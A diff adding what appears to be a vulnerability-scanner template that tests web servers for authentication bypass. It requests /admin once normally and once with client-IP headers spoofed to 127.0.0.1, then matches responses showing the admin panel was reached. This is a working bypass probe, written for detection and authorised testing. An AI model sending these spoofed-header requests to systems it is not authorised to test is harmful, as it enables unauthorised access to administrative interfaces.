@@ -1,0 +1,46 @@
+id: auth-bypass-headers-pro
+
+info:
+  name: Authentication Bypass via Trusted Headers
+  author: ExoShade
+  severity: high
+  tags: auth-bypass,headers,intrusive
+
+http:
+  - raw:
+      - |
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Client-IP: 127.0.0.1
+        X-Real-IP: 127.0.0.1
+        Forwarded: for=127.0.0.1;proto=https;by=127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_2 == 200"
+          - "status_1 != 200 || contains(to_lower(body_1), 'login')"
+
+      - type: word
+        part: body_2
+        words:
+          - "admin"
+          - "dashboard"
+          - "panel"
+        condition: or
+
+      - type: word
+        part: body_2
+        words:
+          - "login"
+          - "sign in"
+          - "unauthorized"
+        negative: true
